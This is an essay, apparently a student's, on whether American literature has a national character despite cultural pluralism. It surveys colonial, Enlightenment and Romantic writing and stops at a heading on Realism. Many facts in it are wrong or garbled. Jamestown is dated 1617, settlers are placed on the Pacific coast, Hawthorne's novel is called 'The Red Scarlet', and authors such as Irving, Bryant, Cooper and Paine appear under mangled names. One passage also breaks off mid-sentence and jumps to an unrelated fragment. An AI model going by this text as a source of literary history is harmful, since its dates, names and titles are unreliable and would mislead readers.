            "  American literature is comparatively younger in the world literature. But due to her great economical and political power, America gradually owns strong social influence. American literature, from growing out of nothing, imitating others creative methods to having its own native character, also experienced a long developing course. Now we have to say American literature is playing an important role on the world literary arena. But in the 1960s a trend of pluralism in literature and art began to spring up, and then developed into a cultural movement of nationalism. Some radicals of cultural pluralism even proclaimed that the so-called American literature actually has no true national character, or there has no American literature in the world at all. They think before the twentieth century, American writers couldnt cast off the influence from Britain and Europe. What they could do was just transplant the advanced culture and civilization from their original country to the New Continent, and bring them into play. After 20th century, a large number of immigrants came to this country. The traditional culture of these people formed a even greater shock to American literature. With the development of the national liberation movement, national-self-respect is growing day by day. Lots of racial writers in America burst out great creative enthusiasm. Their experiences are greatly different from those main current writers in America. These writers of immigrants, minority nationalities, or even aborigines have created many outstanding works which have odd plots and queer contents. The unusual color is expressed in their writing style and the theme in their works. Moreover, these writers also display their puzzlement about their double national identity, their contradictory thoughts between their motherland and the new continent. Some racial writers suggest that their creative action should pursue the racial purity of what they have created. They bring their original cultural tradition into their writing, make their works full of new taste and new implication. All these phenomena blow a fresh air into the American literature. The main literary current is shocked and attacked by these new elements. And this attack gradually focuses its discussion on the national character of American literature. So some pessimistic critics in America will say American literature doesnt has native vitality and distinctive national features any more. In this country, people only have a cultural circle which consists of various racial cultures. These cultures come from different country with their immigrants, their exotic atmosphere, their racial background and their cultural tradition. Many kinds of racial culture organize such a complex and colorful American cultural circle. In this circle, each culture has no relation with each other. Each one owns its purity. Furthermore, American literature is described as a picture paved by mosaic. Each piece has its own color, and is also separated from each other. Thus, it can be dismembered into many parts. We could find no common features about them, or we have to say American literature is not a smelting furnace anymore. It is a paved mosaic picture. All these factors compel American literature to examine its native characters once again from the very beginning, and the critics in America have to evaluate the value of American literature from the new angle. In spite of this, I agree with such a point of view: American literature is a vital force on the world literary arena. Through two hundred years of development, American literature which has its own history, its own national character, has been mature. It has an ability to bear various attacks. In the main literary current which mostly consists of British and European cultural tradition, minority racial literature and, immigrants cultural tradition, even aborigines customs and habits are covered and absorbed. All these factors influence each other, depend on each other, melt each other and finally develop into a stronger American literary current together to make great contribution to the world literature. The birth, the development, and the challenge of cultural pluralism is just the best chance for American literature to accept and withstand the polish of the attack, then strengthen its actual strength, enrich its connotation. Then American literature will become a piece of symphony in which every writer from various cultural traditions can create colorful works freely. Now, lets probe the prosperity of cultural pluralism in America first, so as to understand why I think American literature is a piece of symphony but not a paved mosaic picture. ",
            "The prosperity and the current situation of cultural pluralism in America.",
            "     If we want to know why the cultural pluralism can be flourishing in America, and what effects it will cause with its prosperity, we have to learn what is cultural pluralism.",
            "     Cultural pluralism is a sense of value, still more, it is a cultural phenomenon .As a sense of value, it means the equal treatment to different belief or faith, different seek, as well as the different method of recognizing things in the world. As a cultural phenomenon, it means in American itself, there has been many kinds of cultures and behavior standards which should have no conflict with each other, and can peacefully coexist in the American society. For the American literature, pluralism means various writing style and creative method coming from different cultural tradition can find its bosom friends and can keep its dignity in a common cultural field. The idea of cultural pluralism is supported by many people, especially by the new immigrants. But some meaning of cultural pluralism has been changed by some radical pluralists. They even began to fight against the main-stream culture in America. They deny the national character of American literature. They think it is a hybrid of various racial or tribal cultures. The aforesaid American literature can be treated as a plagiarism of other races. Because the main creation of its literature just followed the creative current of some advanced nations in the world. These radicals make such a conclusion that there is no American literature at all. Such speech makes the idea of creating American unified character and moral, which was established at the beginning of this countrys history, endure great challenge and attack. Crisis is appeared in the American politics, religion, social structure and language structure. Especially in its educational field, such crisis is more obvious. Some radicals think the aim of public education is to protect and prolong the root sense of the race. It will be an effective way to learn every national history and culture to improve the self-respect of minority nationality. However, other people who insist that American be an smelted nation think it might weaken the cohesive force of American people if we supported the mentioned opinion. They announce in advance that the American society will be torn to pieces, and go back again to the tribal age of racial segregation. In the cultural field, the cultural identification in American mentality will disappear due to the negation of American literary character. All these elements will lead to the whole collapse of American society at last. ",
            "     I think both opinions are not fairly objective. As for the history of American establishment, the racial smelting is one of the necessary elements for the countrys survival and development. From the view of its present racial problem, the flourishing of cultural pluralism is the production of contradiction and unequal treatment among various nations. According to the social psychology of those initial immigrants, the formation of a unified nation is inevitable. The discovery of American continent was during the historical period that Europe began to step into a modern and open society. Europe tried its best to let its cultural and powerful influence extend to the whole world. The power of knowledge has been recognized by common people. The probe spirit became the feature of the time. The development of trade made the town and city expand steadily. The struggle between Protestantism and Catholicism stirred strong religious enthusiasm. At the same time, greedy, conquest, racism and slavery became part of the life style of expansionism in Europe. It would be more easily for the immigrants under such historical background to cast off the fetter of tradition. They would have stronger desire to realize their ideal, and they would be more likely to accept mew things, including exotic cultures, life styles of other races, etc. The acceptance of new culture on the new land and the gradual abandon of their native culture among those immigrants mostly came from their own free will. The enthusiasm of establishing a new country was filled in their heart. Although the immigrants in America came from various areas, the people who owned different backgrounds and customs still composed the initial American nation willingly and created American social system and value together. ",
            "    Those American who had different ancestors inevitably possessed some inner fragility when they built their society. There had been contradiction between the national smelting and the national diversity. The early American thinkers also realized this, but they believed that to create an all new country would be more beneficial to those immigrants. So they created a series of theories through their many years practice, such as democracy, self-government, civic participation, etc to create a strong national identity. George Washington, John Adams, and other early excellent politician focused on how to cast off the blackness from Europe, tried to make all the races in the country identified and smelted into a new social, political community. Thoras pan wrote that we own a power to rebuild the world. So from the beginning, the main leaders and thinkers in this country didnt want to keep the old cultural tradition from Europe, but to create a new kind of American culture. Americans who possessed different racial root, who came from different areas, who believed in different faiths, and who have different skin colors would respect a general common and definitely clear ideal system that all western people would believe in too. The ideal system is all men have their dignity and equality. All men have inalienable right to purse freedom, fairness and chance. A Swedish man named Gunnar Myrdal called this idea as American Creed. It is the base of American national identity. American society which have various races and tribes can be developed and improved. One of transcendental representatives Emerson thought: America should be a smelting furnace for all races and the people in this country should be able to create an all-new nation. And this nation would come from a smelting furnace of the black age. She should be strong and powerful. But I have to point that according to the developing situation at that time, white men were the main part on all immigrants. They occupied the top position of a power pyramid. Such situation has been maintained till now and left some hidden trouble for the later national problem. It also did spade work for the flourishing of cultural pluralism. ",
            "  The immigrants zeal and vigor shown in the New continent, especially after the independence of the country let America smelt and assimilate the differences among various white races. The British colonies were relatively stable, developed more quickly than the others, so inevitably English language became the main communicative tool for immigrants. Anglo-Saxon puritans political, cultural and religious ideas and systems as well as the sense of value became the main connotation of American main cultural current, namely the so-called WASP phenomenon. The literature based on such situation would not be able to avoid the Anglo-Saxon features. England and Europe at that time possessed great ideological and economical superiority in the world. So they would have great influence on the new developing America. American literature under such deep influence became more distinctive and perfect. The combination of the literary works and native life formed a unique native literature.",
            "Although American society always think that she has smelted all the races into a strong nation during the past two hundred years. The ideal smelting furnace created by Emerson hadnt been fulfilled till now. It is still a lofty ideal. The difference between each race has just been shortened with the social advancement. While we couldnt think they have been assimilated completely yet. Such as the black people in southern America, they speak English too, and also believe in the white mens religion. But they still be refused by main-stream society in this country. Most of their books havent been smelted in the American main-stream literature as well. ",
            "The world situation after the Second World War formed a new challenge to the smelting idea. After the First World War, some people had put forward a problem of national self-determination. The uprising national liberation movement just like a rising wind and cloud, forced the western colonial system to be collapsed at last after the Second World War. All the social trends occurred in twenties century greatly strengthened the self-confidence of some small and weak nations in the world. The conflict of races and tribes become more and more violent. The whole globe has stepped into a dangerous age of racial confrontation and hostility. This new situation definitely will cause strong reaction to the domestic racial relationship. Due to the improvement and strengthen of racial self-identity, the feeling of immigrants nostalgia, the refresh belief in the traditional culture of their motherland, both create a new thinking tendency about national identification: Many American people no longer insist on Emerson s historical ideal of producing a new race, no longer hope as Milvile that all the tribes and people should constitute a united federal country at the west hemisphere. American people especially those minority racial immigrants begin to seek the root of persons and races, To uphold their ancestors tradition. Old customs start to recover, racial people wont avoid their minority racial culture anymore. Not only among the racial people, but also among the unorthodox white people who have no Anglo-Saxon blood lineage, formed worship of their own cultures. Some of them totally discard the idea of one nation, wont recognize the reality of smelting, but only insist that in this country, various racial communities should exist equally and forever. Even some white people who belong to WASP and have accepted the regular education of this country also advocate for such idea. Some racial young intellectuals such as V. W. Brook, have begun to challenge to the connotation of main-stream culture at the beginning of 20th century. Mr. Brook wrote in his book American Coming of Age that he hoped to establish a kind of all embracing American culture which can reflected the lives of all immigrants of past and present time, and can describe the civil life truthfully. His argument became the theoretical herald of the fashionable cultural pluralism. Another intellectual Horace M. Kallen put forward the appeal of cultural pluralism even more directly. He was called as the father of culture pluralism. He says America does bear some similarities to other races in other countries. American people are not one nation at all. The so-called America is just an ides. And then, some more racial anti-cultural characters raised the emotion of disappointment about American society because of the influence of racism and the war-weariness for Vietnam. These people have accepted good WASP education, but they started to worship oriental mysterious religion, use narcotics and flaunt futuristic things. Under such circumstance, the flourishing of cultural pluralism wont be unimaginable. ",
            "The flourishing of cultural pluralism brings great shock to American society especially to the nationalism of American literature. First, according to some radical peoples theory, American nation doesnt consist of individuals, but of the racial groups. So the racial character, but not political or social characters, becomes the main standard to distinguish American people, as well as the standard to judge the creation of literature. Then, it is very easy to form such a consequence ---- the formed standard to the judgment of American literature is no longer suitable for usage. But there is no one integrated, nation-wide standard to judge, evaluate its literary creation in the whole country. The literary or art criticism falls into a passive and chaotic position. Such result can be looked as a collapse of American dominant culture. Its literary creation will be even more mixed and disorderly. The writers will find no creating direction. We could find no creating topic either. All the works will only be created from the racial point of view to analyze the social problems or to feel the world. The concept of country and nation may disappear due to this reason. The literary works written under such background should bring about further effects on American ideology of common people. The national cohesive force will disappear in the end. Of course, this is the most pessimistic opinion.",
            "\tSecond, the relationship among people in one race will be given a deeper connotation of society and cultural tradition. The cohesive force in each race will have been strengthened. The differences of various skin color, culture and tradition among each race will be more protruding. A society of such kind may cause racial prejudice, deepen racial discrimination and lead to national division. People couldnt obtain the unified national pride from those literary works, because these works are not able to embody such pride. The literary creation will not know what course to take. At last, America will become a substance in which there are various, different foreign traditions and cultures. American will have no main-stream cultural creation which should have been identified by most American people. The  ideological form of American culture and art will be destroyed. People who study it will not know what course to take either. Based on such anxiety, many American sociologists, anthropologists, and literary or art workers feel extremely dismal about the future of literary creation. One modern famous historian has showed his deep concern and anxiety about the crisis which is caused by cultural pluralism. He wrote in his book The Disuniting American that the American country originally was made up of individuals who were able to make choices according to their own will. Now it behaviors in a diametrically opposite way. This country gradually changes into a big hotchpotch made op of many groups including different views and characters. How can the cohesive force go on existing? Some more pessimistic people even think that America might be divided into many smaller self-governing countries just like the former Soviet Russia if it went on to develop like this. American literature has to be differentiated according to the authors ancestor home. And it would have no common national features. This future let people not to know whether to laugh or to cry. ",
            "  As for the shock caused by cultural pluralists, most people are still optimistic. I approve that Although cultural pluralism is reasonable to a certain degree or in a certain sense, and we shouldnt ignore the racial tradition and its culture, the main-stream culture in America still possess powerful influence and couldnt be blotted out at one stroke. I believe the main-stream culture has given and will give great contribution to the world. The literary works is not only the product of the time, but also the reflection of cultural characters, life styles etc in that time. These works dont simply repeat the historical details, but to rebuild and reconstitute the historical experiences, to show deeper ideas and social meanings in it. ..........",
            "  The history of American literature only has two hundred years. Its establishment and development is deeply related with the formation of American nation. The Europeans have discovered American for nearly five hundred years. The aboriginal people were Indians at that time. These native people had already possessed their own custom, tradition and culture. But these couldnt create the later main-stream culture because of the historical reason. At the very beginning, there are many immigrants from various countries of Europe. Black people were shipped and sold from Africa in 17th century. On this new land, all these various races, who have their won cultures and life experiences began to live together. Through long-term constant contact, they gradually formed a new nation ----- American nation. Under such circumstance, its racial structure and cultural structure should be of miscellaneous and derived features. Many people in the world have already recognized that it is an independent culture. But recently, some radical nationalists have noticed that nearly all the literary works created by American citizens were written in English. And also because language is a kind of expressing tool, only by the language which the writer use, can make effective statements about the authors idea. So, the said American literature not only at present, but also forever will be a branch of English literature. I think this theory emphasizes too much on the influence of English literature, exaggerates too much the function and the status of those famous authors in European countries. And it thinks too highly of European civilization. American writers truly discovered and used the native materials in American as well as the writing method which didnt violate English stylistic rules and layout about literary creation. However the reason why an authors works can take a position in the literary history is not because he can make successful transplant of the western civilization, but because his works will be the most profound reflection of his time and his society. His function in not to repeat the whole historical details, but to reveal the reality of life. The famous writers in American history gradually free themselves away from the control of European civilization, especially British literature through these two hundred years. They faced the American social reality, created distinctive and outstanding works. These excellent writers such as Mark Twain, Henry James, displayed rich contents about American life what other racial or national writers couldnt work out for it. We could only call the features of their works as American characters. If we analysis the American authors works in different periods, we could find that it is very obvious that the relationship between the American life and the American literature has been established. Its literary creation has been rooted deeply into the native land, and has been characterized by a distinctive local style or flavor. From the initial letters written for the colonists homeland, then the religious or philosophical debating pumphlets, furthermore the imitating works of Europe, and the unique works which expressed the new life style in America in the end, civilization is unceasingly moving forward. American people have their literature independent at last. I think the most distinctive character of its literature should be the smelting of multitudinous advantages, displaying native color. Now lets take a look at the literary history in America. From its developing history, we can conclude that followed by the countrys flourishing, American literary doesnt simply transplant the advanced civilization of other nations. It creating and reforming ability make itself become an independent literary system full of vigor and character. ",
            "II The development of national literature in American",
            " 1  Literature of colonial America.",
            "    American literature developed very slowly at its initial stage. At that time, North America was in the period of exploitation. The life level is very low. The first urgent problem that should be solved immediately was simply having adequate food an clothing. So it is difficult for people at that time to take their cultural life into account. The works during this periods are mainly about travel notes, diary and religious writing of colonial life in North America. Although these materials couldnt represent the birth of American literature, they also reflected the life conditions and social customs in the early colonies to vary degrees. The literary creation at that time played a positive role on immigrants cultural life. And also brought about some certain effect on the following literary creation. The novel and play which possessed American style and character hadnt appeared yet, but it is understandable that at the very beginning of the formation of a new nation, the literary works created in the new land inevitably had some cultural color of their original homeland. Just because they are good at having those successful writing methods of others to use for themselves, American people can contribute many excellent writers and works to the world in their relatively short literary history. The expressed vigor and boldness in their works predict that this new nation will bring about great influence on the world history.",
            "1) The frontier life and the first American writer----Captain John Smith",
            "   The first permanent English settlement in North America was established at Jamestown, Virginia in 1617. Among the members of the Jamestown settlers was Captain John Smith, an England solider of fortune. His reports of exploration, published in the early 1600s, have been described as the first distinctly American literature to be written in English. Smiths descriptions of America were filled with themes, myths, images, scenes, characters, and events that were a foundation for the nations literature. His vision helped lure the Pilgrims and the Puritans who saw themselves as new saints with a spiritual mission to flee the Old World and create a New Israel, a New Promised Land, in the America that John Smith had described. In fact, what he wrote couldnt be called as literary works. But the thoughts that he displayed in his writings had already broke off with those main ideas in Britain and Europe. The Europe at that time had a turbulent situation. The religious reform came down menacingly.(-----) In fact it was a political movement and mental struggle. The initial immigrants to America also wanted to evade the religious aim on a mew land. While they arrived at this new continent, they insisted their original puritan view, in the mean time, they faced the wide new continent, their new lives were filled with challenge, adventure, and chance. Their creative writings possessed new spirit of vigor, passion and innovation that it is difficult to find those elements in European works at that time. ",
            "John Smiths works just showed such factors and abstracted may readers in England and Europe. May his ideas in his writings couldnt be totally accepted by Europeans, but he and other similar writers stirred and inspired lots of immigrants to create their bright future on this new land. The thoughts created in those writers works were born in the special colonial environment in America, so it own unique and distinctive colonial color, and first appeared the literary character of American works: creative, vigorous, imaginary, and immigrant color. John Smith was called as the first American Writer.",
            "2) Puritan Thoughts ",
            "Somebody has ever said immigrants from Europe to the New Land were by-products of years of upheaval in European continent. During that period, many feudal separatist states in Middle Age fought against each other, and produced several relatively big commercial countries such as: Spain, France, Holland, and England etc. Some reformers of Protestantism such as Martin Luther and John Kelwin destroyed the combination of politics and religion which always governed the European countries in the Middle Age. The spirit of probe and the sense of enjoyment brought people into a great age of art and science. Various thoughts in Europe at that time were countless after the Renaissance. It is difficult for us to describe the usage brought to us by the great thinker Shakespear and the great active giant Collenpo.",
            " Until the 17th, European civilization followed the rush of immigration to step into America. But it is not a simple transportation for the European civilization on the new land. It rooted in America, developed and changed into a unique new civilization possessing rich American local color. America is not only a new continent in explorers eye, but also a new continent of thoughts and spirits. During the political and religious debate on how to live on the new land and how to build a new society, American became a big experimental site of 17th and 18th centuries. The ideas formed in England and Spain could be changed directly into an actual action, and it would not be interfered by the old laws, customs or traditions created by the feudal societies in Europe. ",
            "The differences between American and European literatures during that period are: In Europe, the literary works were full of ideological polemic while in America, we can find so many concrete ideas which had been well shaped already in their literary works. ( examples) The great religious, political and cultural revolution which began with Renaissance, then followed with religious reform, the movement of Enlightenment, and the Reasonable Age in Europe, helped those colonies greatly to create their daily life style. Lots of colonists came to the America with various life goals, established colonies which belonged to their own. The religious beliefs and religious seeks in each colony were greatly different. But in every colony, everyone was trying their best to achieve their aims. American literary writings at that time were also of more revolutionary features than those in Europe in the corresponding period. American main writings still concentrated on religion especially on Puritan ideas. Although they couldnt represent the firth of American literature these writings reflected the immigrants goals, lives and thoughts The most important point is English immigrants have constituted the majority of all the immigrants of Europe. They settled along the narrow western coast of pacific. And this area was relatively more peaceful than the other colonies. At the beginning of immigration, immigrants took various kinds of religious beliefs and customs into the new land, but the were all abstracted into English immigrants communities in the end. The differences were not obviously very much. In 17th century, the colonies on the new continent had been combined into a joint body. They had one social system. They pledged loyalty to English King. The main religion was Puritan. And the main economic was agriculture. Most people spoke English, and gradually formed a literary form that English language took a leading position in it. The literary contents at this time were mainly about religious pursuit. The writers couldnt completely get rid of the control and influence of England and Europe. The creating method was very simple. Individual characters and distinctive national features were not outstanding. But the inheritance of European, esp. English civilization is actually a kind of accumulation for American literature. This period can be treated as the prelude of its birth. It absorbed enough energy from the European culture to pave the road for the national literature. ",
            "2 The literature of Reason and Revolution",
            "    As we have seen, theology dominated the Puritan phase of American writing. Politics was the next subject to command the attention of the best minds. By the mid-eighteenth century, although colonial America still politically depended on England, she was no longer a group of scattered, struggling settlements. It was a series of neighbored, flourishing colonies with rapidly growing, mixed populations. The word state, which suggests an independent government, was beginning to replace colony in the peoples minds ---- an important sign of the political trend. The people of these states were vigorous, the natural resources were rich and plentiful. And the native industries were sprouting everywhere. Literary activities were growing at the same time. The growth, particularly the industrial growth, led to intensity with British government. The British government wanted the colonies to remain politically and economically dependent on the mother country. But the restless, growing American states wanted to be given real liberty to order their own lives and develop their economic growth. So the Britain took a series of measure to insure this dependence and finally, in the seventies of the 18th century, the English colonies in North America rose in arms against their mother country. The war ended in the formation of a federative bourgeois democratic republic ---- the United States of America.",
            "   In the 18th century, the historical situations in each country were quickly different. But Enlightenment movement had spread the whole Europe and nearly every advanced country had been involved in it. This movement is the heritage and the development of the fight against feudal and religious oppression. It accepted the ideas of humanism, and asked to be free from the band of religious control as well as to liberate individual characters. The thinkers of this movement set a further step than those humanists to focus their fighting center on the feudal society. They are determined to break the feudal building down, and establish a powerful bourgeois government. The English and French Enlightenment movements had greater influence on American Independence. Following with the fast development of each colony in 18th century in America, one important industry became flourishing, that is journalism. At the initial period, the spread of ideas of the Enlightenment was largely due to journalism. The American reading public at the time displays great interest in the works of English scientists, philosophers, and writers. The writers of the French Enlightenment, particularly Voltaire, are widely read in America also. Since ideas, in the written or spoken word, inspire and direct mens actions, the writers held vitally important places in the movement for American Independence. ",
            "   The spiritual life in the colonies during that period was to a great degree moulded by the bourgeois Enlightenment ----- a movement supported by all progressive forces of the country who opposed themselves to the old colonial order and religious obscurantism. On the one hand the representatives of the Enlightenment in America absorbed a large amount of the grand essence from the European Enlightenment movement by the help of journalism, they set themselves a task of disseminating knowledge among the people and advocating revolutionary ideas according to their own local situation on the other hand. They also actively participated in the war for Independence of the country. American Enlightenment dealt a decisive blow upon the puritan traditions and brought to life secular education and literature. While they claimed the independence of the country, they introduced new creating methods and writing styles, to make their literature cast off the tradition of Europe and be of unique characters. The writers of the Enlightenment injected an invigorating vein into the English language in America as they aimed at clarity and precision of their writings. The ideal of the American Enlightenment was exemplified in the life and career of Benjamin Franklin, Thomas Pan, and Thomas Jefferson. While at that time, the literature in America remained derivative, the heroic and revolutionary ambitions of the age had created great writings which had shaped the nations beliefs with reason dressed in clear and forceful prose. The inspired writing of Jeffersons Declaration of Independence, Thomas Pans The Crisis, and Benjamin Franklins Autobiography not only helped form the American republic, but also stirred the whole world. Their writings marked the birth of American literature. However, it is still too early to proclaimed that American literature had gained its independence just because of these famous writers and their writings. Although American literature had its own characters from its beginning, it was based on the nutrition of Europe literature and it had to continue to absorb from the England and the European continent. The creating methods and standards in this new country were also belonged to the old continent. But the most important point is that the distinguish features in these articles had heralded American literary independence. Such as a famous poet named Freneau, his poems are rich in the American characters and lyric color. He not only sang for the beautiful nature, but also displayed the life of Indians. His close observation of nature distinguished his treatment of indigenous wild life and other native American subjects. In contrast with the ornate style of his teachers in British, he later developed a natural, simple, and concrete diction, best illustrated in such nature lyrics as The Wild Honey Suckle and The Indian Burying Ground. Freneau did not establish trends, but he represented qualities that were to be characteristic of the next half century. These features are the basement of Romanticism in 19th century. He has been called the Father of American poetry. From Freneaus writings, we can feel clearly that American literature can avoid the influence of the old continent at last and establish its own literature which will be of rich American local color and feature. ",
            "3 The literature of Romanticism",
            "   After the political Independence, American people further called for the independence of culture. The new continent is far away from the corruption and degeneration of Europe. The great undestroyed nature was waiting for descriptions. People who gain new lives on the new land were eager to show their feelings and thoughts. The initial immigrants who had various blood lineage began to smelt into one new nation, the racial differences were more and more insignificant and even disappeared step by step. The new country began to own national cohesion. At the same time, new continental culture and new cultural materials were near at hand. But the art manifestation wont arise suddenly in common life. Although the people in colonies had gain political independence, they had been used to find their cultural standard in English poems, novels, plays, and prose in the cultural lives. American literature in 18th century absorbed the essence of European thoughts on the one hand, and it had to be loyal and obedient to the thoughts and experience of its own country. The literary writers had a strong demand and determination to break completely with outdated conventional ideas from the old continent. But they had to find an expressing method from the traditional cultural examples in their literary creation. The cultural situation on literary arena was new wine in an old bottle. That means new concepts in an old framework in their literary creation. ",
            "      The writers at that time created many works which reflected American themes and which ere very popular among local people while according to the creative methods of English writers. European literature then was in a period of great prosperity. The Romanticism movement widened peoples vision once again. Byron, Wordsworth, and Scotte in England, Luso in France, Cotter in German etc all produced great influence on American literature. Romanticism was disseminated to the new land and further developed in this country. But the developing course in America was greatly different with all those European countries. Romanticism in the new country had some special developing stages, and also produced a branch. American literature embodies its features of smelting furnace once again. The level of its development in American political and economical field hadnt had actual strength to match equally with England, but she was able to and willing to accept the outer advanced civilization. Based on their heritage, American literature made great progress and innovation as the century passed. Native American writers won increasing national and international fame. Although the outstanding writers shown in this period had to follow the European model of creating style, they didnt stay on imitating level simply. They tried their best to bread away from the bind of European tradition and custom, make use of local, fresh materials. For the first time, they created works which were full of national characters. American literature possessed their won typical characters at long last. Its writers also gradually got rid of the dependence on English culture in their creative course. In these works at the moment, new materials which had never been shown in previous periods were used, such as American specific historical tales, the local conditions and customs, beautiful natural scene. The usage of a large amount of fresh local materials, the application of the flexible creative technique, and the accommodation to the country situation made the words in the period imbued with strong national color. So far we have to say that American literature had obtained their national characters when they developed to the period of Romanticism movement. We confessed that most American writers at that time hadnt found an all-new and all-belong-to-America creative method. We could only say that they just found much inspiration from those excellent creative writings of Europe. But this situation should be understood by modern people. When a countrys literature is going to be independent, we shouldnt focus on whether their imitation of others is good or bad, but should concentrate on their innovation after imitation. American writers combined those mature and advanced western civilization width native life and local color so that the relationships between the American literature and American life was clearly established. From those famous works of Romanticism, we could easily conclude that the more local color their works had, the more appreciation readers would give. Some works striving sedulously for perfect imitation would only resulted in the lack of fidelity and their fame in readers hearts was decreased relatively. ",
            "  Romanticism as a literary movement came into being in England early in the latter half of the 18th century. It first made its appearance in England as a renewed interest in medieval literature. It spread to continental Europe and than came to America early in the 19th century. The attitudes of American writers were shaped by their New World environment and an array of ideas inherited from the romantic traditions of Europe. In America, The Romanticism was pluralistic. It frequently showed certain general characteristics: moral enthusiasm, faith in the value of individualism and intuitive, perception, and a presumption that the natural world was a source of goodness and mans societies was a source of corruption. All these ideas were in accordance with the pursuit of simplicity, utility and perfection in America. Yet, its manifestation was as varied, as individualistic, and as conflicting as the cultures and the intellects from which it sprang in Europe. ",
            "The reason of such difference between New Continent and Old Continent for their Romanticism movements was due to the special historical background. In 18th century, the capitalistic force in England and Europe had succeeded. But the conflict among each social stratum was more and more serious. People demanded for democracy and human rights The appeal to oppose feudalism and the capital evil upsurge day by day. Romanticism developed on the base of anti-classicism. When it came to America, the country was independent right now. The emotion of racism was rising highly. Wide western part was waiting for people to explore. In the southern part of the country, white people were served comfortably by black slaves. Both the country and the compatriots in it were filled with vigor and enthusiasm. They seek for further improvement. Just at this time, Romanticism movement came to this land when the national Independence was awakened. Although Owen treated Kersmith as his creating model, Blant respected Wordsworth, Copper used Scottes method for reference in his writing, Their creative material laid more emphasis on individuals than their examples. They admired the magnificent natural scene and the endless profound mystery. American literature of Romanticism had a great leap in the course of its Independence. Works which could be accepted by nearly whole people in this country began to emerge. ",
            "   Owen, one of representatives in Pre-Romanticism period, was the first American author who gained international fame for America. His best known stories awakened a deep interest in the life of American regions from the Hudson valley to the prairies of the west. He was called Father of American Literature. If we say Owen set a model of Romanticism for American short novel and prose, Brant led American poem step into a simple, pure and fresh period. The later writers as Longfellow, Lower, etc followed his creative principals. Just like Owen, Brant learned freedom from the foreign Romanticism, and guided the American literary movement from simple imitation to creation. He was looked as a true native poet in America. If somebody doesnt want to call Owen and Brant as national writers due to their imitating trace, the Copper have to be spoken as the first national writer produced in this New Land. He took a first concrete step towards pure American literature. Copper thought America had its own traditional customs, and specific view. If American literature couldnt reflect all these materials truthfully, it wont hold a position on the world literary arena. In his famous novel ",
            "m their creating emotion to their writing style, must create thoroughly an all-new literature, so as to make American literature be independent in the world. ",
            "  The above-mentioned three writers are the heralds of American literature. But it is Emerson who unified the abstracted idea of Romantic image and the reality of American life in middle 19th century. Due to him, American Romanticism became a kind of mature system of emotion and thought. It can root deeply in American land. He as well as other writers such Thoreau etc, became the representative of Transcendentalism. ",
            "Transcendentalism was developed on the base of Pre-Romanticism in American native land. It believed in the transcendence of the over soul, an all-pervading power for goodness from which all things come and of which all things are a part. As a philosophical and literary movement, transcendentalism flourished in New England from the 1830s to the Civil War. Its doctrines found their greatest literary advocates in Emerson, who believed that man was a part of absolute good. The gist of his works is to affirm the roles and statues of human being. He laid great emphasis on peoples spirit but not their intuition. The worlds exits for human being. Man should grasp his destine in ones own hands. He believed above all in individuals independence of mind and self-reliance. His advance mind was affected in his creative works. (..) He didnt write his poem or prose in an ornate way but an elegant and fresh style. The implications of his works were very profound. He broke the traditional rules and forms of poetic composition; initiated a new custom of free verse. The following white man and many other poets were affected deeply by him. At that time, the growth of cultural nationalism aroused American writers to write patriotic works, to song for the grandeur of the American people and their land. Not only article works, other kind o f creative works which possessed local color were loved by people. Emersons creation pandered the needs and tastes of American people, satisfied the desire of literary independence. His talk on The American Scholar was vividly reported, very much discussed, and has often been called the second American declaration of independence ---- a declaration of cultural independence for the United States. His philosophy was quite a difference, for more closely related to the life of his time and place that to those sources came from Europe and Britain. Although he also absorbed the thoughts of humanism in England and Europe, his esoteric doctrines become thoroughly Americanized in his thoughts had his main works.",
            "The awaking for the literary nationality among Emerson and other scholars was not accidental or isolated. It is a kind of destination for the historical development. This awaking embodied the social reality, moved by calls for a national literature. Writers became to celebrate American meadows, groves, and streams. Nationalism stimulated a greater literary interest in American language and it common people. In 1828 Noah webster published An American Dictionary of the English language, American character types speaking local dialects appeared in poetry and fiction with increasing frequency. American farmers, the poor, the unlettered were also be celebrated by literature. American people had sought new liberty and new idea in life and art. All these elements contributed greatly to a cultural reawakening which brought a flowering of New England, led by Longfellow, Lowell and Whittier. These helped American literature own its national color, and also let American people have their own native writers. Besides the above-mentioned writers, other outstanding writers gain great fame in the world as well such as: Howther, his unique gift was for the creation of strongly symbolic stories which touch the deepest roots of mans moral nature. The Red Scarlet was a first symbolic novel in America. Melvill, whose book is stepped in symbolism, is another strong appeal to readers even of this century. For the poetic creation, the person who is most worthy of mention is Whitman. He avoided the band of traditional meter. Whitman thought that the voice of democracy should not be haltered by traditional forms of verse. The poetic style he devised is now called free verse ---- that is to say poetry without a fired beat or regular rhyme scheme. His most famous poem is Leaves of Grass. In his poetry, whitman combined the ideal of the democratic common man with that of the rugged individual. He envisioned the poet as a hero, a savior and a prophet, one who leads the community by his expression of the truth. Whitmans poem represented the climax but also the end of the Romanticism movement in America. His works were greatly based on the Americanized demoncracy. Leaves of Grass is really a manifesto for the new poetry. Although at that time, the radical English poet, William Blake, had pioneered in using a sort of free verse for his long revolutionary Prophetic Books as early as in 1791, these remained virtually unknown until the twentieth century and Blake himself never commented on or developed the form as such. He is still very much better known for his powerful metrical, often rhymed poetry, so that it does not seem unfair to ignore him in speaking, as most critic do, of Whitman as the originator of the modern form. Whitman played an important role on the development of American poem as well as the form of American realistic literature. He was called as an excellent democratic poet in 19th century. ",
            "Other schools of literature were shown in America in 19th century too. The literature of slavery abolition was an important aspect. The problem of slave-owning system was a main conflict in the American society. Many writers used their pens to reveal and condemned such system. Black literature had shown in the period. The main contents were black songs, folk tales and legends etc. ",
            "Now we can see that American literature was gradually mature with the pace of the country development. From the initial total acceptance of European advanced civilization to combination with the national condition, from the all-around imitation to the European article creation to the total riddance of the European and British influence, American literature had created her own literary types and forms. American people can say proudly that their literature was independence then. One view we have to point out is that literary independent doesnt means literary isolation. Independence refers to getting rid of appendage and to avoiding fetter. American literature should just like its social development. Its independence should be open. After its independence, American literature should still absorb the nutrition of other civilization. And this kind of absorption will not be just from Britain or Europe, but can from other countries or other races such as those in Asia, Africa, etc. Together with the further development of this century, and the further smelting of its nations, the inner cohesive force will be stronger. It will be easier for American society to diminish the racial difference. American literature will also own greater all-embracing ability. ",
            "4 The Literature of Realism ",
